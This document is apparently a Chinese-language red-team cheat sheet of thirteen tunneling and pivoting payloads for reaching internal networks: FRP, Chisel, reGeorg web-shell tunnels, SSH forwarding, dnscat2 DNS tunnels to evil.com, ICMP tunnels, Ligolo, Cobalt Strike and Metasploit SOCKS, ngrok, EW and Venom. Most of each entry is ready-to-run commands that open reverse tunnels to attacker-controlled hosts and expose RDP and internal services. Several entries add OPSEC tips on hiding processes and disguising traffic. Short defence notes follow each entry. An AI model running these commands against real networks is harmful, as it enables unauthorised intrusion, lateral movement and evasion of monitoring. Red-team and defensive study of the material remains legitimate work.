# 隧道代理

_13 条 intranet payload_

### FRP内网穿透  `tunnel-frp`
_使用FRP建立内网穿透隧道_
子类：**TCP隧道** · tags: `frp` `tunnel` `proxy` `nat`

**前置条件：**
- 公网服务器
- 内网机器可访问公网
- FRP工具

**攻击链：**

**服务端配置**
> FRP服务端配置文件frps.ini
_platform: linux_
```
[common]
bind_port = 7000
```
**语法解析：**
- `bind_port` — 服务端监听端口 _parameter_

**客户端配置**
> FRP客户端配置文件frpc.ini
_platform: windows_
```
[common]
server_addr = attacker_ip
server_port = 7000

[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 3389
```
**语法解析：**
- `server_addr` — 服务端IP _parameter_
- `local_port` — 本地端口 _parameter_
- `remote_port` — 远程端口 _parameter_

**启动服务端**
> 启动FRP服务端
_platform: linux_
```
./frps -c frps.ini
```

**启动客户端**
> 启动FRP客户端
_platform: windows_
```
frpc.exe -c frpc.ini
```


**分析：** FRP可以建立TCP隧道，将内网服务映射到公网。

**OPSEC 提示：**
- FRP流量可能被检测
- 考虑使用加密传输
- 注意隐藏进程

**概述：** FRP是一款高性能的反向代理应用，可以将内网服务暴露到公网。

**漏洞原理：** 内网机器可以访问公网时，攻击者可以建立隧道将内网服务映射出去。

**利用方法：** 利用流程：1) 在公网服务器部署FRP服务端；2) 在内网机器运行FRP客户端；3) 建立隧道连接；4) 通过隧道访问内网服务。

**防御措施：** 防御措施：1) 监控异常外联流量；2) 限制出站连接；3) 部署流量分析设备；4) 禁止未授权的代理工具。

---

### Chisel内网穿透  `tunnel-chisel`
_使用Chisel建立内网穿透隧道_
子类：**HTTP隧道** · tags: `chisel` `tunnel` `proxy` `http`

**前置条件：**
- 公网服务器
- 内网机器可访问公网
- Chisel工具

**攻击链：**

**服务端**
> 启动Chisel服务端
_platform: linux_
```
./chisel server -p 8000 --reverse
```
**语法解析：**
- `chisel server` — Chisel服务端模式 _command_
- `-p 8000` — 监听端口 _parameter_
- `--reverse` — 允许反向隧道 _parameter_

**反向SOCKS**
> 建立反向SOCKS代理
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:socks
```

**端口转发**
> 端口转发
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389
```


**分析：** Chisel可以建立HTTP隧道，穿透防火墙。

**OPSEC 提示：**
- Chisel使用HTTP协议
- 可以绑定域名伪装
- 流量加密

**概述：** Chisel是一款快速的TCP/UDP隧道工具，通过HTTP传输。

**漏洞原理：** HTTP隧道可以绕过防火墙限制，将内网服务暴露出去。

**利用方法：** 利用流程：1) 在公网服务器运行Chisel服务端；2) 在内网机器运行Chisel客户端；3) 建立隧道；4) 通过代理访问内网。

**防御措施：** 防御措施：1) 监控异常HTTP流量；2) 检测长连接；3) 部署流量分析。

---

### ReGeorg隧道  `tunnel-regeorg`
_通过Web Shell建立隧道_
子类：**ReGeorg** · tags: `tunnel` `regeorg` `proxy`

**前置条件：**
- Web Shell上传
- 支持脚本语言

**攻击链：**

**上传隧道脚本**
> 上传对应语言的隧道脚本
```
上传tunnel.aspx/tunnel.jsp/tunnel.php到目标Web服务器
```

**建立隧道**
> 启动SOCKS代理
_platform: linux_
```
python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
```
**语法解析：**
- `-p 1080` — 本地监听端口 _parameter_
- `-u http://target/tunnel.aspx` — 隧道脚本URL _parameter_

**配置代理**
> 通过代理扫描
_platform: linux_
```
proxychains nmap -sT -Pn target
```


**概述：** ReGeorg通过Web Shell建立SOCKS代理隧道。

**漏洞原理：** Web服务器可上传执行脚本。

**利用方法：** 利用流程：1) 上传隧道脚本 2) 建立隧道 3) 通过代理访问

**防御措施：** 防御措施：1) 限制文件上传 2) 监控异常请求

---

### SSH本地转发  `tunnel-ssh-local`
_SSH本地端口转发_
子类：**SSH** · tags: `ssh` `tunnel` `local`

**前置条件：**
- SSH访问权限

**攻击链：**

**本地转发**
> 将目标80端口映射到本地8080
_platform: linux_
```
ssh -L 8080:target:80 user@jump
```
**语法解析：**
- `-L 8080:target:80` — 本地转发：本地8080->target:80 _parameter_
- `user@jump` — SSH跳板机 _value_


**概述：** SSH本地转发可以将远程端口映射到本地。

**漏洞原理：** SSH访问可以建立隧道。

**利用方法：** 利用流程：1) 建立SSH连接 2) 配置转发 3) 访问本地端口

**防御措施：** 防御措施：1) 限制SSH端口转发 2) 监控SSH连接

---

### SSH远程转发  `tunnel-ssh-remote`
_SSH远程端口转发_
子类：**SSH** · tags: `ssh` `tunnel` `remote`

**前置条件：**
- SSH访问权限

**攻击链：**

**远程转发**
> 将本地80端口映射到远程8080
_platform: linux_
```
ssh -R 8080:localhost:80 user@jump
```
**语法解析：**
- `-R 8080:localhost:80` — 远程转发：远程8080->本地80 _parameter_
- `user@jump` — SSH跳板机 _value_


**概述：** SSH远程转发可以将本地端口暴露到远程。

**漏洞原理：** SSH访问可以建立反向隧道。

**利用方法：** 利用流程：1) 建立SSH连接 2) 配置反向转发 3) 从远程访问

**防御措施：** 防御措施：1) 限制SSH端口转发 2) GatewayPorts no

---

### SSH动态转发  `tunnel-ssh-dynamic`
_SSH动态SOCKS代理_
子类：**SSH** · tags: `ssh` `tunnel` `socks`

**前置条件：**
- SSH访问权限

**攻击链：**

**动态转发**
> 创建SOCKS代理
_platform: linux_
```
ssh -D 1080 user@jump
```
**语法解析：**
- `-D 1080` — 动态转发，创建SOCKS5代理 _parameter_
- `user@jump` — SSH跳板机 _value_

**使用代理**
> 通过SOCKS代理访问
_platform: linux_
```
proxychains nmap -sT -Pn target
```


**概述：** SSH动态转发创建SOCKS代理，可访问任意目标。

**漏洞原理：** SSH访问可以建立SOCKS代理。

**利用方法：** 利用流程：1) 建立SSH连接 2) 创建SOCKS代理 3) 通过代理访问

**防御措施：** 防御措施：1) 限制SSH端口转发 2) 监控SSH连接

---

### DNS隧道  `tunnel-dns`
_通过DNS协议建立隧道_
子类：**DNS** · tags: `dns` `tunnel` `covert`

**前置条件：**
- DNS解析权限
- 可控域名

**攻击链：**

**使用dnscat2**
> 启动dnscat2服务器
_platform: linux_
```
ruby dnscat2.rb evil.com --dns port=53,domain=evil.com
```

**客户端连接**
> 客户端连接到服务器
_platform: windows_
```
dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET
```

**建立隧道**
> 建立SOCKS隧道
_platform: linux_
```
session -i 1
listen 127.0.0.1:1080 10.0.0.1:1080
```


**概述：** DNS隧道利用DNS协议传输数据，绕过防火墙。

**漏洞原理：** DNS通常被允许通过防火墙。

**利用方法：** 利用流程：1) 配置域名 2) 启动服务器 3) 客户端连接

**防御措施：** 防御措施：1) 限制DNS查询 2) 监控异常DNS流量

---

### ICMP隧道  `tunnel-icmp`
_通过ICMP协议建立隧道_
子类：**ICMP** · tags: `icmp` `tunnel` `covert`

**前置条件：**
- ICMP允许通过
- 管理员权限

**攻击链：**

**使用icmptunnel**
> 服务端启动
_platform: linux_
```
icmptunnel -s 10.0.0.1
```

**客户端连接**
> 客户端连接
_platform: linux_
```
icmptunnel -c attacker.com
```


**概述：** ICMP隧道利用ICMP Echo包传输数据。

**漏洞原理：** ICMP通常被允许通过防火墙。

**利用方法：** 利用流程：1) 启动服务端 2) 客户端连接 3) 建立隧道

**防御措施：** 防御措施：1) 限制ICMP 2) 监控异常ICMP流量

---

### Ligolo隧道  `tunnel-ligolo`
_Ligolo内网穿透工具_
子类：**Ligolo** · tags: `ligolo` `tunnel` `proxy`

**前置条件：**
- 可执行代理程序

**攻击链：**

**启动服务端**
> 启动Ligolo代理服务
_platform: linux_
```
sudo proxy -selfcert
```

**运行代理**
> 目标机器运行代理
_platform: windows_
```
agent.exe -connect attacker:11601 -ignore-cert
```

**创建隧道**
> 创建隧道接口
_platform: linux_
```
session
start
```


**概述：** Ligolo是现代化的内网穿透工具，支持多平台。

**漏洞原理：** 可以在目标机器运行代理程序。

**利用方法：** 利用流程：1) 启动服务端 2) 运行代理 3) 创建隧道

**防御措施：** 防御措施：1) 监控异常进程 2) 限制出站连接

---

### SOCKS代理  `socks-proxy`
_建立SOCKS代理访问内网_
子类：**SOCKS** · tags: `socks` `proxy` `tunnel`

**前置条件：**
- 已有内网访问点

**攻击链：**

**SSH SOCKS代理**
> SSH动态端口转发
_platform: linux_
```
ssh -D 1080 user@jumpserver
或
ssh -D 1080 -N -f user@jumpserver
```
**语法解析：**
- `-D 1080` — 本地SOCKS代理端口 _parameter_
- `-N` — 不执行远程命令 _parameter_
- `-f` — 后台运行 _parameter_

**ProxyChains配置**
> 配置ProxyChains
_platform: linux_
```
编辑 /etc/proxychains.conf:
[ProxyList]
socks5 127.0.0.1 1080

使用:
proxychains nmap -sT target
```

**Cobalt Strike SOCKS**
> CS SOCKS代理
_platform: windows_
```
beacon> socks 1080
在CS中启动SOCKS代理
```

**Metasploit SOCKS**
> MSF SOCKS代理
_platform: linux_
```
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
```


**概述：** SOCKS代理可穿透内网访问更多资源。

**漏洞原理：** 存在可访问的内网入口点。

**利用方法：** 利用流程：1) 获取跳板机 2) 建立SOCKS代理 3) 访问内网

**防御措施：** 防御措施：1) 网络隔离 2) 监控异常连接 3) 限制出站流量

---

### Ngrok内网穿透  `tunnel-ngrok`
_使用Ngrok建立内网穿透_
子类：**Ngrok** · tags: `ngrok` `tunnel` `penetration`

**前置条件：**
- Ngrok账号
- 可访问外网

**攻击链：**

**安装Ngrok**
> 安装并配置Ngrok
```
下载: https://ngrok.com/download
tar -xvzf ngrok.zip
./ngrok authtoken YOUR_TOKEN
```

**HTTP隧道**
> 创建HTTP隧道
```
./ngrok http 80
将本地80端口映射到公网
```

**TCP隧道**
> 创建TCP隧道
```
./ngrok tcp 3389
将本地3389端口映射到公网
```
**语法解析：**
- `http` — HTTP协议隧道 _keyword_
- `tcp` — TCP协议隧道 _keyword_

**自定义域名**
> 使用自定义域名
```
./ngrok http -hostname=custom.domain.com 80
```


**概述：** Ngrok可将内网服务暴露到公网。

**漏洞原理：** 内网可访问外网。

**利用方法：** 利用流程：1) 安装Ngrok 2) 创建隧道 3) 访问内网服务

**防御措施：** 防御措施：1) 监控出站连接 2) 限制Ngrok域名 3) 网络隔离

---

### EW内网穿透  `tunnel-ew`
_使用EW建立内网穿透_
子类：**EW** · tags: `ew` `tunnel` `socks`

**前置条件：**
- 已有内网访问点

**攻击链：**

**正向代理**
> 正向SOCKS代理
_platform: linux_
```
./ew -s ssocksd -l 1080
在跳板机上启动SOCKS代理
```
**语法解析：**
- `-s ssocksd` — SOCKS服务模式 _parameter_
- `-l 1080` — 监听端口 _parameter_

**反向代理**
> 反向SOCKS代理
_platform: linux_
```
攻击机: ./ew -s rcsocks -l 1080 -e 8888
跳板机: ./ew -s rssocks -d attacker_ip -e 8888
```

**多级级联**
> 多级级联
_platform: linux_
```
./ew -s lcx_tran -l 1080 -f 2nd_hop -g 9999
多级跳板穿透
```


**概述：** EW是轻量级的内网穿透工具。

**漏洞原理：** 存在可访问的内网跳板。

**利用方法：** 利用流程：1) 上传EW 2) 建立隧道 3) 访问内网

**防御措施：** 防御措施：1) 监控异常进程 2) 网络隔离 3) 限制出站

---

### Venom内网穿透  `tunnel-venom`
_使用Venom建立内网穿透_
子类：**Venom** · tags: `venom` `tunnel` `socks`

**前置条件：**
- 已有内网访问点

**攻击链：**

**启动服务端**
> 启动服务端
_platform: linux_
```
./venom_server -lport 9999
在攻击机启动服务端
```

**连接客户端**
> 连接服务端
```
./venom_client -rhost attacker_ip -rport 9999
在跳板机连接服务端
```
**语法解析：**
- `-rhost` — 服务端IP _parameter_
- `-rport` — 服务端端口 _parameter_

**建立SOCKS**
> 建立SOCKS代理
```
 Venom > socks 1080
建立SOCKS代理
```

**端口转发**
> 端口转发
```
Venom > lforward 127.0.0.1 3389 13389
将内网3389转发到本地13389
```


**概述：** Venom支持多级代理和SOCKS。

**漏洞原理：** 存在可访问的内网跳板。

**利用方法：** 利用流程：1) 启动服务端 2) 连接客户端 3) 建立代理

**防御措施：** 防御措施：1) 监控异常进程 2) 网络隔离 3) 限制出站

---
